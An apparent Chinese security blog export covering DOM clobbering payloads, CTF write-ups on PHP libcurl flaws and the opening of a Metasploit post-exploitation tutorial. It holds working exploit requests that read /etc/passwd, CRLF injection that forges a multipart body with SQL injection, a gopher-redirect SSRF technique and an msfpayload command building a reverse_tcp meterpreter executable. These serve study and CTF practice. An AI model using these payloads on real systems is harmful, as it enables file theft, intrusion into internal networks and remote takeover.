<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>];<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">  obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>前面的代码展示了是string类型的属性，但是他们并不一定都是可以操作的，为了检查他们是否是可读可写的，需要用下面代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">var</span> props=[];</span><br><span class="line">    DOM =<span class="built_in">document</span>.getElementById(<span class="string">"content"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">        obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line">        <span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                DOM.innerHTML = <span class="string">'&lt;'</span>+html[i]+<span class="string">' id=x '</span>+prop+<span class="string">'=1&gt;'</span>;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)[prop] == <span class="number">1</span>) &#123;</span><br><span class="line">                        props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                                            </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>在这些DOM属性中有两个有意思的属性分别是”username”和”password”,他们是<code>&lt;a&gt;</code>标签的DOM节点的属性，但是并不是html中定义的属性，好像并不能通过html属性控制。</p>
<p>这两个属性可以通过url的中的username字段和password字段提供。但是需要注意一定需要有<code>@</code>符号</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"ftp:Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">alert(x.username)<span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="actionscript">alert(x.password)<span class="comment">//Clobbered-password</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用http协议也可以，但是需要添加 <code>//</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"http://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    alert(x.username)<span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="actionscript">    alert(x.password)<span class="comment">//Clobbered-password</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意一点，如果依赖于<code>&lt;a&gt;</code>标签的<code>toString</code>函数将dom对象转换为字符串，获取的字符串总是经过url编码的，例如下面这样：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"http:&lt;&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    alert(x) <span class="comment">//http://myip:8888/%3C%3E</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时可以利用一些根本不存在的协议来绕过：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"abc:&lt;&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    alert(x)<span class="comment">//abc:&lt;&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Firefox浏览器允许在base标签中定义协议，然后在a标签中使用，能够获取到未经过urlencode的数据</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">a:abc</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"Firefox&lt;&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    alert(x)<span class="comment">//Firefox&lt;&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>chrome浏览器也可以实现类似的效果，但是获取的值在base标签的href属性中。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"a://Clobbered&lt;&gt;"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">name</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">name</span>=<span class="string">xyz</span> <span class="attr">href</span>=<span class="string">123</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">alert(x.xyz)<span class="comment">//a://Clobbered&lt;&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x4-获取三级以上的对象引用"><a href="#0x4-获取三级以上的对象引用" class="headerlink" title="0x4 获取三级以上的对象引用"></a>0x4 获取三级以上的对象引用</h3><p>使用iframe的srcdoc属性可以创建任意层数的对象引用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(a.b.c.d),<span class="number">500</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当时上面有一个问题，就是必须使用<code>setTimeout</code>设置一个延迟以保证iframe加载完毕。这里好的办法是利用style/link标签导入一个外部的样式表来创造一个小的延迟：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="keyword">@import</span> <span class="string">'//portswigger.net'</span>;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP的libcurl中存在的一些问题</title>
    <url>/2017/12/17/PHP%E7%9A%84libcurl%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p><strong>未经许可禁止转载</strong></p>
<p>看了近来的几场ctf题目，学习了一些关于php libcurl的一些知识，在这里总结一下。</p>
<a id="more"></a>
<h4 id="0x1发送POST请求时造成任意文件读取"><a href="#0x1发送POST请求时造成任意文件读取" class="headerlink" title="0x1发送POST请求时造成任意文件读取"></a>0x1发送POST请求时造成任意文件读取</h4><p>PHP manual上对<strong>CURLOPT_POSTFIELDS</strong> 这个选项的描述如下：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/12/1-1.png" alt="http://pic.wonderkun.cc/uploads/2017/12/1-1.png"></p>
<p>也就是说当<strong>CURLOPT_POSTFIELDS</strong>传入的数据是urlencode 的字符串的时候，发出POST请求时的</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span><br></pre></td></tr></table></figure>

<p>这是一个正常的HTML forms应该有的头</p>
<p>当传入的数据是数组的时候，此时发出的POST请求的头是</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: multipart/<span class="keyword">form</span>-<span class="keyword">data</span></span><br></pre></td></tr></table></figure>

<p>是一个上传文件需要的头，那么如果传入的数据是array，当<strong>CURL_SAFE_UPLOAD</strong>（PHP5.5.0的时候，次选项默认是false）设置为false的时候，以@开头的value就会被当做文件上传，造成任意文件读取。代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?$_GET[<span class="string">'username'</span>]:<span class="string">"admin"</span>;</span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"username"</span>=&gt; $username</span><br><span class="line">);</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch,CURLOPT_SAFE_UPLOAD,<span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_POSTFIELDS,$data);</span><br><span class="line">$res = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br></pre></td></tr></table></figure>

<p>请求<code>http://127.0.0.1:8080/index.php?url=http://wonderkun.cc:9999/&amp;username=@index.php</code></p>
<p>就可以获取到<code>index.php</code>的内容</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/12/2-1.png" alt="http://pic.wonderkun.cc/uploads/2017/12/2-1.png"></p>
<h4 id="0x2-用file协议会忽略host-造成任意文件读取"><a href="#0x2-用file协议会忽略host-造成任意文件读取" class="headerlink" title="0x2 用file协议会忽略host,造成任意文件读取"></a>0x2 用file协议会忽略host,造成任意文件读取</h4><p>这里是LCTF的一道题目:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_GET[<span class="string">'site'</span>]; $url_schema = parse_url($url); </span><br><span class="line">$host = $url_schema[<span class="string">'host'</span>]; </span><br><span class="line">$request_url = $url.<span class="string">"/"</span>;</span><br><span class="line"><span class="keyword">if</span> ($host !== <span class="string">'www.baidu.com'</span>)&#123; <span class="keyword">die</span>(<span class="string">"wrong site"</span>); &#125;</span><br><span class="line">$ci = curl_init();</span><br><span class="line">curl_setopt($ci, CURLOPT_URL, $request_url); </span><br><span class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"> $res = curl_exec($ci); </span><br><span class="line">curl_close($ci); </span><br><span class="line"><span class="keyword">if</span>($res)&#123; <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Source Code:&lt;/h1&gt;"</span>; <span class="keyword">echo</span> $request_url; <span class="keyword">echo</span> <span class="string">"&lt;hr /&gt;"</span>; <span class="keyword">echo</span> htmlentities($res); &#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">"get source failed"</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>这里请求：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span><span class="regexp">/index.php?site=file:/</span><span class="regexp">/www.baidu.com/</span>etc<span class="regexp">/passwd%23</span></span><br></pre></td></tr></table></figure>

<p>就可以造成任意文件读取，但是经过我的测试，这个bug跟libcurl的版本有关</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ curl --version</span><br><span class="line">curl 7.54.0 (x86_64-apple-darwin17.0) libcurl/7.54.0 LibreSSL/2.0.20 zlib/1.2.11 nghttp2/1.24.0</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line">Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy</span><br><span class="line">➜  ~ curl file://www.baidu.com/etc/passwd</span><br><span class="line">curl: (3) Invalid file://hostname/, expected localhost or 127.0.0.1 or none</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@iZwz9g11g0cdei6qd02gjrZ:~<span class="comment"># curl --version</span></span><br><span class="line">curl 7.47.0 (x86_64-pc-linux-gnu) libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line">Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP UnixSockets</span><br><span class="line">root@iZwz9g11g0cdei6qd02gjrZ:~<span class="comment"># curl file://www.baidu.com/etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>具体是哪个版本修复了这个bug，我也没测清楚。</p>
<p>不过<code>file://localhost/etc/passwd</code>这种uri是一直被允许的，这就说到了phithon师傅在小密圈中说到的小tips</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$parts = parse_url($url);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure>

<p>请求如下，造成任意文件读取：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/test.php?url=file://localhost/etc/passwd</span><br><span class="line"><span class="comment"># 因为用的是file_get_contents(),只有localhost才可以使用</span></span><br></pre></td></tr></table></figure>

<h4 id="0x3-如果可以控制CURLOPT-HTTPHEADER，就造成CRLF漏洞"><a href="#0x3-如果可以控制CURLOPT-HTTPHEADER，就造成CRLF漏洞" class="headerlink" title="0x3 如果可以控制CURLOPT_HTTPHEADER，就造成CRLF漏洞"></a>0x3 如果可以控制<strong>CURLOPT_HTTPHEADER</strong>，就造成CRLF漏洞</h4><p>也许你会问CURLOPT_HTTPHEADER参数本来就可以控制的php的curl发请求时的请求头，那还需要有CRLF漏洞干什么？</p>
<p>其实有了CRLF漏洞，并不是仅仅可以控制请求头那么简单，我们还可以控制POST请求的请求体，甚至可以把原来只是POST数据的请求，修改为POST一个文件。</p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])? addslashes($_GET[<span class="string">'username'</span>]):<span class="string">"admin"</span>;</span><br><span class="line">$header = <span class="keyword">isset</span>($_GET[<span class="string">'header'</span>])?array_map(<span class="string">"urldecode"</span>,$_GET[<span class="string">'header'</span>]):<span class="keyword">array</span>();</span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"username"</span>=&gt; $username</span><br><span class="line">);</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_POSTFIELDS,$data);</span><br><span class="line">curl_setopt($ch,CURLOPT_HTTPHEADER,$header);</span><br><span class="line">$res = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br></pre></td></tr></table></figure>

<p>当请求如下：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1:8080/index.php?url=http://wonderkun.cc:9999/&amp;header</span>[<span class="string"></span>]=Referer:%20test&amp;username=admin%27</span><br></pre></td></tr></table></figure>

<p><img src="http://pic.wonderkun.cc/uploads/2017/12/3-1.png" alt="http://pic.wonderkun.cc/uploads/2017/12/3-1.png"></p>
<p>可以看到admin已经被转义了，但是我们可以自己注入一个body体，来绕过这种转义：</p>
<p>请求如下</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/index.php?url=http://wonderkun.<span class="keyword">cc</span>:<span class="number">9999</span>/&amp;header[]=Content-Length<span class="symbol">%3</span>A<span class="symbol">%20400</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aContent-Type<span class="symbol">%3</span>A<span class="symbol">%20</span>multipart<span class="symbol">%2</span>fform-data<span class="symbol">%3</span>B<span class="symbol">%20</span>boundary<span class="symbol">%3</span>D------------------------d<span class="number">467</span>b<span class="number">8408</span>a<span class="number">94</span>bf<span class="number">7</span>d<span class="symbol">%0</span>d<span class="symbol">%0</span>a<span class="symbol">%0</span>d<span class="symbol">%0</span>a--------------------------d<span class="number">467</span>b<span class="number">8408</span>a<span class="number">94</span>bf<span class="number">7</span>d<span class="symbol">%0</span>d<span class="symbol">%0</span>aContent-Disposition<span class="symbol">%3</span>A<span class="symbol">%20</span>form-data<span class="symbol">%3</span>B<span class="symbol">%20</span>name<span class="symbol">%3</span>D<span class="symbol">%22</span>username<span class="symbol">%22</span><span class="symbol">%0</span>d<span class="symbol">%0</span>a<span class="symbol">%0</span>d<span class="symbol">%0</span>aadmin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span><span class="symbol">%3</span>D<span class="number">1</span><span class="symbol">%20</span><span class="symbol">%23</span><span class="symbol">%0</span>d<span class="symbol">%0</span>a--------------------------d<span class="number">467</span>b<span class="number">8408</span>a<span class="number">94</span>bf<span class="number">7</span>d--<span class="symbol">%0</span>d<span class="symbol">%0</span>a&amp;username=admin<span class="symbol">%27</span></span><br></pre></td></tr></table></figure>

<p>可以看到发送的数据为：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/12/4-1.png" alt="http://pic.wonderkun.cc/uploads/2017/12/4-1.png"></p>
<p>测试一下php是否可以识别这种请求,写个test.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// filename:test.php</span></span><br><span class="line">  var_dump($_POST);</span><br></pre></td></tr></table></figure>

<p>再来测试一下：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/12/5-1.png" alt="http://pic.wonderkun.cc/uploads/2017/12/5-1.png"></p>
<p>看来通过CRLF注入来来修改请求体是完全可行的。</p>
<p>在<a href="https://github.com/wonderkun/CTF_web/tree/master/web400-5" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/web400-5</a>这个题目中我就是利用这种技巧，把一个一般的POST类型的SSRF请求修改为一个上传文件的请求，实现攻击内网的任意文件上传漏洞，getshell的。</p>
<p>当然这个题目还有一些别的解法，比如利用302跳转为gopher协议等。</p>
<h4 id="0x4-libcurl的gopher协议支持"><a href="#0x4-libcurl的gopher协议支持" class="headerlink" title="0x4 libcurl的gopher协议支持"></a>0x4 libcurl的gopher协议支持</h4><img src="/uploads/2017/12/6-1.png" alt="" width="1818" height="710" class="alignnone size-full wp-image-676" />

<p>libcurl 支持这么多种协议，使其功能非常强大。其中对gopher协议的支持，在SSRF中非常有用。有了gopher协议，就相当于可以把一个http请求转化为任意的TCP连接。</p>
<p>有很多文章都分析了利用gopher协议攻击内网，例如redis，memcache，等服务的payload，这里就不再赘述了。其实gopher协议还可以伪造任意类型的HTTP请求，也就是上面说的那个题利用gopher协议的解法（当时出题的时候以为不能用gopher，十分抱歉）。</p>
<p>思路就是先请求一个外网的地址，返回一个302跳转，302跳转返回头的Location字段设置为一个gopher协议伪造的POST上传文件的请求，请求内网地址，最后getshell。</p>
<p>由于payload比较复杂，只做一个伪造GET请求的例子:</p>
<p>外网的302.php的内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  header(<span class="string">"Location: gopher://wonderkun.cc:80/_GET%20/index.html/%20HTTP/1.1%0d%0aHost:%20wonderkun.cc%0d%0aContent-Length:%202%0d%0a%0d%0a"</span>);</span><br></pre></td></tr></table></figure>

<p>访问这个文件，就会发起一个GET请求，到wonderkun.cc的80端口。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>libcurl</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit渗透技巧：后渗透Meterpreter代理</title>
    <url>/2015/03/30/Metasploit%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8FMeterpreter%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>前言</p>
<p>Metasploit是一个免费的、可下载的渗透测试框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击测试。它本身附带数百个已知软件漏洞的专业级漏洞攻击测试工具。</p>
<a id="more"></a>

<p>当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来测试那些未打过补丁或者刚刚打过补丁的漏洞。</p>
<p>正是因为Metasploit团队一直都在努力开发各种攻击测试工具，并将它们贡献给所有Metasploit用户，软件厂商再也不能推迟发布针对已公布漏洞的补丁了。</p>
<p>本文将科普下metasploit隧道代理的使用技巧。</p>
<p>0×00 获取meterpreter</p>
<p>1.首先生成可执行文件</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# msfpayload windows/meterpreter/reverse_tcp  LHOST=192.168.101.105 LPORT=444 X > meter.exe
[!] ************************************************************************
[!] *               The utility msfpayload is deprecated!                  *
[!] *              It will be removed on or about 2015-06-08               *
[!] *                   Please use msfvenom instead                        *
[!] *  Details: https://github.com/rapid7/metasploit-framework/pull/4333   *
[!] ************************************************************************
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/reverse_tcp
 Length: 281
Options: {"LHOST"=>"192.168.101.105", "LPORT"=>"444"}</pre>
<p>2.启动msfconsole，监听反连端口</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# msfconsole
[*] Starting the Metasploit Framework console.../ 
Taking notes in notepad? Have Metasploit Pro track &amp; report
your progress and findings -- learn more on http://rapid7.com/metasploit
       =[ metasploit v4.11.0-2014122301 [core:4.11.0.pre.2014122301 api:1.0.0]]
